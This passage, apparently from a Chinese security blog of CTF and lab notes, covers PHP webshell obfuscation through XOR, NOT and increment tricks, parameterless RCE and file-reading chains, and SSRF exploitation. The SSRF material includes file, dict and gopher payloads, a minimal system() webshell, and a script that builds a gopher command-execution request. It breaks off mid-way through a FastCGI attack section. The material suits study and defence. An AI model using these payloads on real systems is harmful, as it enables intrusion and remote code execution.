	<span class="token punctuation">&#125;</span></span></code></pre>

<p>利用非字母数字字符，配合运算符得到需要的字符。</p>
<h2 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h2><p>在PHP中，两个变量的值进行异或时，会先将两个变量的值转换为ASCII，再将ASCII转换为二进制，再对二进制数据进行异或，再转为ASCII，最后转为字符串。</p>
<p>由此可以构造脚本得到一个字典，然后需要哪个字符的时候就遍历字典。</p>
<ul>
<li><p>构造字典</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"output.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
<span class="token variable">$dict</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
<span class="token variable">$preg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/[A-Za-z0-9]+/'</span><span class="token punctuation">;</span>

<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 前16个前面加0</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"0"</span> <span class="token operator">.</span> <span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 10转16</span>
    <span class="token keyword">else</span> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 如果被限制了直接跳过这个字符</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$preg</span><span class="token punctuation">,</span> <span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">continue</span><span class="token punctuation">;</span> <span class="token comment">// 16转ascii</span>
    <span class="token comment">// 没被限制加%，就变成了url编码</span>
    <span class="token keyword">else</span> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"%"</span> <span class="token operator">.</span> <span class="token variable">$a</span><span class="token punctuation">;</span>

    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 前16前面加0</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"0"</span> <span class="token operator">.</span> <span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">else</span> <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 只要不被限制的</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$preg</span><span class="token punctuation">,</span> <span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token comment">// 在前面加%组成url编码</span>
            <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"%"</span> <span class="token operator">.</span> <span class="token variable">$b</span><span class="token punctuation">;</span>
            <span class="token comment">// 记录异或得到的内容、由哪两个异或来的</span>
            <span class="token variable">$out</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          	<span class="token comment">//	只要可用字符</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$out</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">31</span> <span class="token operator">&amp;&amp;</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$out</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">127</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// ascii转10</span>
                <span class="token variable">$dict</span> <span class="token operator">=</span> <span class="token variable">$dict</span> <span class="token operator">.</span> <span class="token variable">$out</span> <span class="token operator">.</span> <span class="token string double-quoted-string">" "</span> <span class="token operator">.</span> <span class="token variable">$a</span> <span class="token operator">.</span> <span class="token string double-quoted-string">" "</span> <span class="token operator">.</span> <span class="token variable">$b</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token variable">$dict</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre>
</li>
<li><p>遍历字典</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">search</span><span class="token punctuation">(</span>word<span class="token punctuation">)</span><span class="token punctuation">:</span>
    a <span class="token operator">=</span> <span class="token string">''</span>
    b <span class="token operator">=</span> <span class="token string">''</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> word<span class="token punctuation">:</span>
        f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"output.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span>
        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
            dic <span class="token operator">=</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> dic <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">:</span><span class="token keyword">break</span>
            <span class="token keyword">if</span> dic<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> i<span class="token punctuation">:</span>
                a <span class="token operator">+=</span> dic<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span>
                b <span class="token operator">+=</span> dic<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>
                <span class="token keyword">break</span>
        f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    output <span class="token operator">=</span> <span class="token string">"('"</span><span class="token operator">+</span>a<span class="token operator">+</span><span class="token string">"'^'"</span><span class="token operator">+</span>b<span class="token operator">+</span><span class="token string">"')"</span>
    <span class="token keyword">return</span> output

s1 <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"[+] your function:"</span><span class="token punctuation">)</span>
s2 <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"[+] your command:"</span><span class="token punctuation">)</span>
flag <span class="token operator">=</span> search<span class="token punctuation">(</span>s1<span class="token punctuation">)</span> <span class="token operator">+</span> search<span class="token punctuation">(</span>s2<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">";"</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></code></pre></li>
</ul>
<img src="/2022/08/06/%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84webshell/image-20220806171447231.png" class="" loading="lazy">

<p>成功执行！</p>
<img src="/2022/08/06/%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84webshell/image-20220806173524099.png" class="" loading="lazy">

<h2 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h2><p>在PHP中，字符串被取反后还会在eval函数中执行。</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$function</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"system"</span><span class="token punctuation">;</span>
<span class="token variable">$command</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"ls"</span><span class="token punctuation">;</span>

<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"(~"</span><span class="token operator">.</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token variable">$function</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">")(~"</span><span class="token operator">.</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token variable">$command</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">");"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre>

<img src="/2022/08/06/%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84webshell/image-20220806172855556.png" class="" loading="lazy">

<p>成功执行！</p>
<img src="/2022/08/06/%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84webshell/image-20220806173618635.png" class="" loading="lazy">

<h2 id="自增"><a href="#自增" class="headerlink" title="自增"></a>自增</h2><p>利用PHP中的<a href="https://www.php.net/manual/zh/language.operators.increment.php">递增&#x2F;递减运算符</a>，也就是说<code>&#39;a&#39;++ =&gt; &#39;b&#39;</code>，那么理论上只要能构造出任意字母即可执行命令。</p>
<p>在php中，强制输出数组时，数组将被转换成字符串<code>Array</code>，那么就可以拿到A了。</p>
<img src="/2022/08/06/%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84webshell/image-20220807234815237.png" class="" loading="lazy">

<h1 id="无参数"><a href="#无参数" class="headerlink" title="无参数"></a>无参数</h1><p>当限制参数的时候如何操作呢？核心代码如下：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string single-quoted-string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[^\W]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    
    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>核心思路就是<strong>通过嵌套函数达到读文件或者RCE</strong>的目的，重点就是对PHP原生函数的利用。</p>
<p><strong>scandir</strong>可以返回指定目录下有哪些文件，scandir(‘.’)就可以看到当前目录下有哪些文件，再利用数组函数选择需要读的文件读取。</p>
<p>常用的数组函数：</p>
<ol>
<li><a href="https://www.php.net/manual/zh/function.end.php">end()</a>- 将数组的内部指针指向最后一个单元</li>
<li><a href="https://www.php.net/manual/zh/function.key.php">key()</a>- 从关联数组中取得键名</li>
<li><a href="https://www.php.net/manual/zh/function.each.php">each()</a>- 返回数组中当前的键／值对并将数组指针向前移动一步</li>
<li><a href="https://www.php.net/manual/zh/function.prev.php">prev()</a>- 将数组的内部指针倒回一位</li>
<li><a href="https://www.php.net/manual/zh/function.reset.php">reset()</a>- 将数组的内部指针指向第一个单元</li>
<li><a href="https://www.php.net/manual/zh/function.next.php">next()</a>- 将数组中的内部指针向前移动一位</li>
</ol>
<p>常用的读文件函数：</p>
<ol>
<li>show_source</li>
<li>readfile</li>
<li>highlight_file</li>
<li>file_get_contents</li>
<li>readgzfile</li>
</ol>
<p>payload：show_source(数组操作选择文件(scandir(路径)));</p>
<p>那么只需要构造出需要的路径就行了。</p>
<h2 id="localeconv"><a href="#localeconv" class="headerlink" title="localeconv"></a>localeconv</h2><p><code>localeconv</code>函数返回一包含本地数字及货币格式信息的数组，再通过<code>current</code>和<code>pos</code>，返回数组中的单元默认第一个：</p>
<img src="/2022/08/06/%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84webshell/image-20220816100328039.png" class="" loading="lazy">

<p>或者<code>reset</code>函数将内部指针指向数组中的第一个元素，并输出。</p>
<img src="/2022/08/06/%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84webshell/image-20220816101740631.png" class="" loading="lazy">

<h2 id="chr"><a href="#chr" class="headerlink" title="chr"></a>chr</h2><p><code>chr</code>函数可以从不同的ascii返回字符，且以256为周期循环，46对应的点，那么构造出46就行了，有多种思路：</p>
<ol>
<li><p>利用<a href="https://www.w3school.com.cn/php/php_ref_math.asp">PHP中的数学函数</a>构造出46。种子可以用数学常量，或者特殊函数的返回值。例如：<code>chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))));</code></p>
<img src="/2022/08/06/%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84webshell/image-20220816104755870.png" class="" loading="lazy">
</li>
<li><p>利用<a href="https://www.w3school.com.cn/php/php_ref_date.asp">PHP中的时间函数</a>构造出46。chr函数是以256为周期循环返回字符，所以只要在增加或者周期性变化的返回值都可以得到<code>.</code>，例如：<code>chr(pos(localtime()));</code></p>
<img src="/2022/08/06/%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84webshell/image-20220816110002100.png" class="" loading="lazy"></li>
</ol>
<h2 id="crypt"><a href="#crypt" class="headerlink" title="crypt"></a>crypt</h2><p>利用<code>crypt</code>函数返回 DES、Blowfish 或 MD5 算法加密的字符串，其中有概率出现<code>.</code>或者<code>/</code>在末尾。种子可以利用时间函数得到。再利用<code>ord</code>函数返回字符串中第一个字符的Ascii值，而<code>hebrevc</code>可以得到第一位为<code>.</code>的字符串。</p>
<img src="/2022/08/06/%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84webshell/image-20220816111342400.png" class="" loading="lazy">

<p>也可以用<code>strrev</code>将字符串倒序，这样可以得到第一位为<code>.</code>或者<code>/</code>的字符串。</p>
<img src="/2022/08/06/%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84webshell/image-20220816111104220.png" class="" loading="lazy">

<p><code>crypt(serialize(array())))</code>也可以得到以<code>.</code>或者<code>/</code>结尾的字符串，再利用<code>strrev</code>倒序：</p>
<img src="/2022/08/06/%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84webshell/image-20220816111833197.png" class="" loading="lazy">

<h2 id="getcwd"><a href="#getcwd" class="headerlink" title="getcwd"></a>getcwd</h2><p><code>getcwd</code>可以得到当前目录的绝对路径</p>
<img src="/2022/08/06/%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84webshell/image-20220816113030394.png" class="" loading="lazy">

<h2 id="realpath"><a href="#realpath" class="headerlink" title="realpath"></a>realpath</h2><p><code>realpath(&#39;.&#39;)</code>可以得到当前目录的绝对路径：</p>
<img src="/2022/08/06/%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84webshell/image-20220816140209612.png" class="" loading="lazy">

<h2 id="dirname"><a href="#dirname" class="headerlink" title="dirname"></a>dirname</h2><p><code>dirname</code>可以返回路径中的目录部分。</p>
<img src="/2022/08/06/%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84webshell/image-20220816143824926.png" class="" loading="lazy">

<p>由此可以读取其他路径的文件。要注意的是，在读其他目录的文件时要先用<code>chdir</code>切换目录，否则读取的还是原路径：</p>
<img src="/2022/08/06/%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84webshell/image-20220816201722199.png" class="" loading="lazy">

<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://blog.csdn.net/miuzzx/article/details/108569080">ctfshow web入门 web41</a></p>
<p><a href="https://www.freebuf.com/articles/web/261800.html">php rce之无参数读文件</a></p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>ssrf</title>
    <url>/2022/08/14/ssrf/</url>
    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>​	SSRF(<strong>S</strong>erver-<strong>S</strong>ide <strong>R</strong>equest <strong>F</strong>orgery)，即服务器请求伪造，是一种由攻击者构造，从而<strong>让服务端发起请求</strong>的一种安全漏洞，<br>它将一个可以发起网络请求的服务当作跳板来攻击其他服务，SSRF的攻击目标一般是内网。<br>​    当服务端提供了从其他服务器获取数据的功能(如:从指定URL地址获取网页文本内容、加载指定地址的图片、下载等)，<br>但是没有对目标地址做过滤与限制时就会出现SSRF。</p>
<h1 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h1><ol>
<li>能够对外发起网络请求的地方，就可能存在 SSRF 漏洞</li>
<li>从远程服务器请求资源（Upload from URL，Import &amp; Export RSS Feed）</li>
<li>数据库内置功能（Oracle、MongoDB、MSSQL、Postgres、CouchDB）</li>
<li>Webmail 收取其他邮箱邮件（POP3、IMAP、SMTP）</li>
<li>文件处理、编码处理、属性信息处理（ffmpeg、ImageMagic、DOCX、PDF、XML）</li>
</ol>
<h1 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h1><ol>
<li>可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的<a href="https://www.cnblogs.com/yuanshu/p/11588341.html">banner 信息</a></li>
<li>攻击运行在内网或本地的应用程序</li>
<li>对内网 WEB 应用进行指纹识别，通过访问默认文件实现(如：readme文件)</li>
<li>攻击内外网的 web 应用，主要是使用 GET 参数就可以实现的攻击(如：Struts2，sqli)</li>
<li>下载内网资源(如：利用<code>file</code>协议读取本地文件等)</li>
<li>进行跳板</li>
<li>无视cdn</li>
<li>利用Redis未授权访问，HTTP CRLF注入实现getshell</li>
</ol>
<h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><p><code>file_get_contents()</code>、<code>fsockopen()</code>、<code>curl_exec()</code>、<code>fopen()</code>、<code>readfile()</code>等函数使用不当会造成SSRF漏洞</p>
<h1 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h1><ol>
<li><code>file</code>： 在有回显的情况下，利用 file 协议可以读取任意内容</li>
<li><code>dict</code>：泄露安装软件版本信息，查看端口，操作内网redis服务等</li>
<li><code>http(s)</code>：探测内网主机存活</li>
<li><code>gopher</code>：gopher支持发出GET、POST请求</li>
</ol>
<p>主要了解一下gopher协议，平时用的比较少：</p>
<p><code>gopher</code>协议是一种信息查找系统，他将<code>Internet</code>上的文件组织成某种索引，方便用户从<code>Internet</code>的一处带到另一处。在<code>WWW</code>出现之前，<code>Gopher</code>是<code>Internet</code>上最主要的信息检索工具，Gopher站点也是最主要的站点，使用<code>tcp70</code>端口。利用此协议可以攻击内网的 Redis、Mysql、FastCGI、ftp等等，也可以发送 GET、POST 请求。这拓宽了 SSRF 的攻击面。</p>
<pre class="language-none"><code class="language-none">gopher协议的格式：gopher:&#x2F;&#x2F;IP:port&#x2F;_TCP&#x2F;IP数据流</code></pre>

<ul>
<li>gopher协议发送http get请求</li>
</ul>
<blockquote>
<p>构造<code>HTTP</code>数据包</p>
<p><code>URL</code>编码、替换回车换行为<code>%0d%0a</code>，<code>HTTP</code>包最后加<code>%0d%0a</code>代表消息结束</p>
<p>发送<code>gopher</code>协议, 协议后的<code>IP</code>一定要接端口</p>
</blockquote>
<ul>
<li>发送http post请求</li>
</ul>
<blockquote>
<p><code>POST</code>与<code>GET</code>传参的区别：它有<code>4</code>个参数为必要参数</p>
<p>需要传递<code>Content-Type</code>，<code>Content-Length</code>，<code>host</code>，<code>post</code>参数</p>
</blockquote>
<h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>关键代码：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$link</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$curlobj</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curlobj</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_POST</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curlobj</span><span class="token punctuation">,</span><span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span><span class="token variable">$link</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curlobj</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$result</span><span class="token operator">=</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$curlobj</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$curlobj</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token variable">$result</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span></code></pre>

<h2 id="内网访问"><a href="#内网访问" class="headerlink" title="内网访问"></a>内网访问</h2><p>使用http协议直接对内网的Web应用进行访问</p>
<blockquote>
<p>payload：<a href="http://localhost/flag.txt">http://localhost/flag.txt</a></p>
</blockquote>
<img src="/2022/08/14/ssrf/image-20220814121710304.png" class="" loading="lazy">

<h2 id="伪协议读文件"><a href="#伪协议读文件" class="headerlink" title="伪协议读文件"></a>伪协议读文件</h2><p>利用伪协议可以直接拿到文件源码内容</p>
<blockquote>
<p>Payload：file:&#x2F;&#x2F;&#x2F;Applications&#x2F;phpstudy&#x2F;WWW&#x2F;flag.php</p>
</blockquote>
<img src="/2022/08/14/ssrf/image-20220814122739624.png" class="" loading="lazy">

<h2 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h2><p>利用<code>dict</code>和<code>http</code>协议可以探测内网主机和端口存活情况：</p>
<blockquote>
<p>payload：url&#x3D;dict:&#x2F;&#x2F;127.0.0.1:3306</p>
</blockquote>
<img src="/2022/08/14/ssrf/image-20220814125217534.png" class="" loading="lazy">

<p>可以看到我这里3306端口是打开的，版本号是<code>8.0.28</code></p>
<img src="/2022/08/14/ssrf/image-20220814131009804.png" class="" loading="lazy">

<h2 id="发POST请求"><a href="#发POST请求" class="headerlink" title="发POST请求"></a>发POST请求</h2><p>可以利用<code>gopher</code>协议发起POST请求</p>
<ul>
<li><p>接收文件<code>post.php</code>代码：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$shell</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$shell</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></span></code></pre></li>
</ul>
<p>先构造POST请求包，与GET不同，必须传递<code>Content-Type</code>，<code>Content-Length</code>，<code>host</code>，<code>post</code>参数，否则会报错</p>
<pre class="language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/post.php</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">127.0.0.1</span></span>
<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span>
<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">8</span></span>

shell=ls</code></pre>

<p>再使用如下python脚本生成标准格式的gopher协议</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parse

payload <span class="token operator">=</span> \
<span class="token triple-quoted-string string">"""POST /post.php HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 8

shell=ls
"""</span>
tmp <span class="token operator">=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>payload<span class="token punctuation">)</span> <span class="token comment"># 将换行编码成%0a</span>
new <span class="token operator">=</span> tmp<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'%0A'</span><span class="token punctuation">,</span><span class="token string">'%0D%0A'</span><span class="token punctuation">)</span>	<span class="token comment"># 在gopher协议中，进行URL编码，会将回车换行编码为%0d%0a</span>
result <span class="token operator">=</span> <span class="token string">'gopher://127.0.0.1:80/'</span><span class="token operator">+</span><span class="token string">'_'</span><span class="token operator">+</span>new <span class="token comment"># 拼接成完整payload</span>
result <span class="token operator">=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token comment"># 再次url编码，因为</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span></code></pre>

<p>得到标准格式协议：</p>
<blockquote>
<p>gopher%3A&#x2F;&#x2F;127.0.0.1%3A80&#x2F;_POST%2520&#x2F;post.php%2520HTTP&#x2F;1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application&#x2F;x-www-form-urlencoded%250D%250AContent-Length%253A%25208%250D%250A%250D%250Ashell%253Dls%250D%250A</p>
</blockquote>
<p>成功执行：</p>
<img src="/2022/08/14/ssrf/image-20220814200618396.png" class="" loading="lazy">

<h2 id="攻击FastCGI协议"><a href="#攻击FastCGI协议" class="headerlink" title="攻击FastCGI协议"></a>攻击FastCGI协议</h2><ul>
<li><strong>FastCGI</strong>（Fast Common Gateway Interface）就是一个通信协议，相比HTTP协议，HTTP是浏览器与服务器中间件进行数据交换的协议，而FastCGI就是服务器中间件与某个语言后端进行数据交换的协议。</li>
</ul>
<p>HTTP协议是<strong>浏览器和服务器中间件进行数据交换的协议</strong>，浏览器将HTTP头和HTTP体用某个规则组装成数据包，以TCP的方式发送到服务器中间件，服务器中间件按照规则将数据包解码，并按要求拿到用户需要的数据，再以HTTP协议的规则打包返回给服务器。</p>
<p>类比HTTP协议来说，FastCGI协议则是<strong>服务器中间件和某个语言后端进行数据交换的协议</strong>。FastCGI协议由多个record组成，record也有header和body一说，服务器中间件将这二者按照FastCGI的规则封装好发送给语言后端，语言后端解码以后拿到具体数据，进行指定操作，并将结果再按照该协议封装好后返回给服务器中间件。</p>
<p>和HTTP头不同，Record中Header的大小固定8个字节，body的大小是由头中的contentLength指定，其结构如下：</p>
<pre class="language-none"><code class="language-none">typedef struct &#123;
  &#x2F;* Header *&#x2F;
  unsigned char version; &#x2F;&#x2F; 版本
  unsigned char type; &#x2F;&#x2F; 本次record的类型
